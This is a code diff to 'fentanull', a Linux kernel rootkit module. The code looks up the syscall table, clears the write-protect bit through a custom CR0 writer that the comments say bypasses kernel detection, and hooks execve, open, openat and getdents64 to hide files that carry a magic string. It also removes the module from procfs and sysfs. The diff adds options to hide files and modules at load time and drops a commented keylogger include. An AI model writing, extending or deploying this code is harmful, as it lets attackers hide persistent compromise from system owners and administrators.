@@ -16,12 +16,9 @@
 #include <linux/namei.h>
 #include <linux/list.h>
 #include <linux/proc_fs.h>
-#include <linux/keyboard.h>
 #include <linux/preempt.h>
 #include <linux/notifier.h>
 #include "consts.h"
-
-/*#include "utils/keylogger.c"*/
 
 MODULE_AUTHOR("cow");
 MODULE_LICENSE("GPL");
@@ -52,6 +49,7 @@ static unsigned long *sys_call_table;
 static pte_t *pte; 
 static struct fentanull_info hidden; 
 static int hook_type; 
+static int owned;
 
 typedef asmlinkage long (*old_openat_type)(int dirfd, const char *pathname, int flags, mode_t mode);
 typedef asmlinkage long (*old_open_type)(const char *pathname, int flags, mode_t mode); 
@@ -69,7 +67,7 @@ old_getdents64_type old_getdents64;
 module_param(hook_type, int, S_IRUSR);
 
 /* the kernel will know if WP in cr0 has been modified in write_cr0, 
- * so we need to create our own vesion to bypass the detection */
+ * so we need to create our own vesion to bypass this */
 
 inline void custom_write_cr0(unsigned long cr0)
 { 
@@ -82,7 +80,6 @@ static inline void cr0_enable(int mode)
 	{
 		case 1: 
 		{
-			preempt_disable();
 			unsigned long cr0 = read_cr0();
 			custom_write_cr0(cr0 & (~0x00010000));
 			#ifdef DEBUG
@@ -92,7 +89,6 @@ static inline void cr0_enable(int mode)
 		}
 		case 0: 
 		{	
-			preempt_enable();
 			unsigned long cr0 = read_cr0();
 			custom_write_cr0(cr0 | (0x00010000));
 			#ifdef DEBUG
@@ -111,7 +107,6 @@ static inline void pte_enable(int mode)
 	{ 
 		case 1: 
 		{ 
-
 			pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 			pte->pte |= _PAGE_RW; 
 			break;
@@ -124,6 +119,7 @@ static inline void pte_enable(int mode)
 		}
 	}
 }
+
 void mod_hide(void)
 { 
 	/* removing fentanull from procfs and sysfs */ 
@@ -141,7 +137,7 @@ asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *
 	#ifdef DEBUG
 	printk(KERN_ALERT "[-] rk: execve hooked\n");
 	#endif 
-	if ((hidden.mod & hidden.files) == 1)
+	if (owned == 1)
 		return old_execve(filename, argv, envp);
 	else 
 	{
@@ -152,7 +148,7 @@ asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *
 		printk(KERN_ALERT "[-] rk[execve][1]: %s", kfilename);
 		printk(KERN_ALERT "[-] rk[execve][2]: %s", filename);
 		#endif
-		if (strstr(kfilename, MAGICSTR)!=NULL)
+		if ((strstr(kfilename, MAGICSTR) != NULL) && (hidden.files == 1))
 		{ 
 			#ifdef DEBUG 
 			printk(KERN_ALERT "[-] rk: hiding file"); 
@@ -168,14 +164,14 @@ asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *
 	}
 } 
 
-/*========== OPEN ============ */
+/*========== OPEN ============*/
 
 asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
 { 
 	#ifdef DEBUG 
 	printk(KERN_ALERT "[-] rk: open called\n"); 
 	#endif
-	if ((hidden.mod & hidden.files) == 1)
+	if (owned == 1)
 		return old_open(pathname, flags, mode); 
 	else {
 		char *kpathname; 
@@ -185,7 +181,7 @@ asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
 		printk(KERN_ALERT "[-] rk[open][1]: %s", kpathname);
 		printk(KERN_ALERT "[-] rk[open][2]: %s", pathname);
 		#endif
-		if (strstr(kpathname, MAGICSTR)!=NULL)
+		if ((strstr(kpathname, MAGICSTR) != NULL) && (hidden.files == 1))
 		{
 			#ifdef DEBUG 
 			printk(KERN_ALERT "[-] rk: hiding file\n");
@@ -201,13 +197,16 @@ asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
 	}
 }
 
-/*========== OPENAT ============ */
+/*========== OPENAT ============*/
 asmlinkage int fentanull_openat(int dirfd, const char *pathname, int flags, mode_t mode)
 { 
-	/* For some reason, the original hook completely breaks my Arch installation but works fine on Lxubuntu. Will investigate later. */
+	#ifdef DEBUG 
+	printk(KERN_ALERT "[-] rk: openat called\n"); 
+#endif 
 	return old_openat(dirfd, pathname, flags, mode);
 }
 
+/*========== GETDENTS64 ============*/ 
 asmlinkage fentanull_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 { 
 	#ifdef DEBUG
@@ -224,12 +223,14 @@ asmlinkage fentanull_getdents64(unsigned int fd, struct linux_dirent64 *dirp, un
 		return ret;
        	if (entry->d_name == NULL)
 		return ret; 	
+	if (owned == 1)
+		return ret;
 	while (i < ret)
 	{ 
-		if ((strstr(entry->d_name, MAGICSTR)) != NULL)
+		if (((strstr(entry->d_name, MAGICSTR)) != NULL) && (hidden.files == 1))
 		{
 			#ifdef DEBUG
-			printk(KERN_ALERT "[-] rk: hiding file\n"); 
+			printk(KERN_ALERT "[-] rk[getdents64]: hiding file\n"); 
 			#endif
 			int reclen = entry->d_reclen; 
 			char *nextrec = (char *)entry + reclen; 
@@ -398,6 +399,9 @@ static int __init fentanull_init(void)
 	printk(KERN_ALERT "[-] rk: Fentanull initialized.\n");
 	#endif
 	memset(&hidden, 0x0, sizeof(hidden));
+	hidden.mod = 0; 
+	hidden.files = 0; 
+	owned = 0; 
 	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
 	if (sys_call_table == NULL)
 	{ 
@@ -409,7 +413,12 @@ static int __init fentanull_init(void)
 	else 
 	{
 		/* comment this out for debugging */ 
+		#ifdef HIDE_FILES_ON_LOAD 
+		hidden.files = 1; 
+		#endif 
+		#ifdef HIDE_MODULES_ON_LOAD
 		mod_hide(); 
+		#endif 
 		if (hook_type == 1)
 		{
 			cr0_enable(1);
@@ -418,7 +427,6 @@ static int __init fentanull_init(void)
 			set_open(1); 
 			set_execve(1); 
 			set_getdents64(1);
-
 			cr0_enable(0);
 			return 0;	
 		}       
@@ -429,7 +437,6 @@ static int __init fentanull_init(void)
 			set_open(1); 
 			set_execve(1); 
 			set_getdents64(1);
-
 			pte_enable(0);
 			return 0;
 		}
